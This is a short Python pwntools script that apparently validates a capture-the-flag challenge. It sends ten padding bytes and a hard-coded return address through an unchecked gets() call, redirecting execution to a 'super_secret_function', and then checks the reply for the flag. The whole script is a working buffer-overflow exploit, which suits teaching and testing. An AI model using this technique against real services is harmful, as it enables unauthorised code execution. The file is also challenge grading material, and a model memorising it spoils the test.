#This challenge is based on a simple BOF that occurs in gets(input) which later *can* redirect code execution
from pwn import *
import time

def main(ip, port, flag):
    try:
        r = remote(ip, port)
        r.sendline("A"*10 + "\x07\x08\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00") #0000000000400807

        #we pad with 10 A's then inject the address in code which we want to redirect code to.
        #In this case super_secret_function
        response = b""
        time.sleep(4)
        response += r.recv()
        print("Response: " + str(response))
        if flag in str(response):
            print("Correct")
            exit(0)
        else:
            print("Incorrect")
            exit(1)
    except Exception as e:
        print("fail due to ")
        print(e)
        exit(1)

#Validation section
flag = input("Flag: ").replace("\n", "")
ip, port = input("service: ").split(":")
main(str(ip), int(port), str(flag))
